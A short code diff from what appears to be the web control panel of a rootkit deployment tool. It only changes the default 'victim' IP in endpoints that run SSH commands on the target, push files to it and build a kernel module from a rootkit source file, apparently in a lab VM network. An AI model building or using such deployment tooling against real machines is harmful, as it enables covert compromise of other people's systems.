@@ -1218,14 +1218,14 @@ async def api_deploy_ssh(request: Request):
     Executer une commande sur la victime via SSH.
     Endpoint utilise par le panneau de deploiement de l'interface web.
 
-    Body JSON : {"cmd": "...", "victim_ip": "192.168.122.18"}
+    Body JSON : {"cmd": "...", "victim_ip": "192.168.122.146"}
     """
     token = request.headers.get("X-Token", "")
     if not check_token(token):
         return JSONResponse({"error": "not authenticated"}, 401)
     data = await request.json()
     cmd = data.get("cmd", "")
-    victim_ip = data.get("victim_ip", "192.168.122.18")
+    victim_ip = data.get("victim_ip", "192.168.122.146")
     if not cmd:
         return JSONResponse({"error": "no command"}, 400)
     # run_in_executor : execute dans un thread pool (subprocess est bloquant)
@@ -1249,7 +1249,7 @@ async def api_deploy_push(request: Request):
     data = await request.json()
     local_path = data.get("local_path", "")
     remote_path = data.get("remote_path", "")
-    victim_ip = data.get("victim_ip", "192.168.122.18")
+    victim_ip = data.get("victim_ip", "192.168.122.146")
     if not local_path or not remote_path:
         return JSONResponse({"error": "missing paths"}, 400)
     if not os.path.exists(local_path):
@@ -1281,7 +1281,7 @@ async def api_deploy_build(request: Request):
     if not check_token(token):
         return JSONResponse({"error": "not authenticated"}, 401)
     data = await request.json()
-    victim_ip = data.get("victim_ip", "192.168.122.18")
+    victim_ip = data.get("victim_ip", "192.168.122.146")
     source_dir = "/tmp/_wlkom_build"
     ko_source = os.path.join(os.path.dirname(__file__), "..", "rootkit", "wlkom.c")
     if not os.path.exists(ko_source):
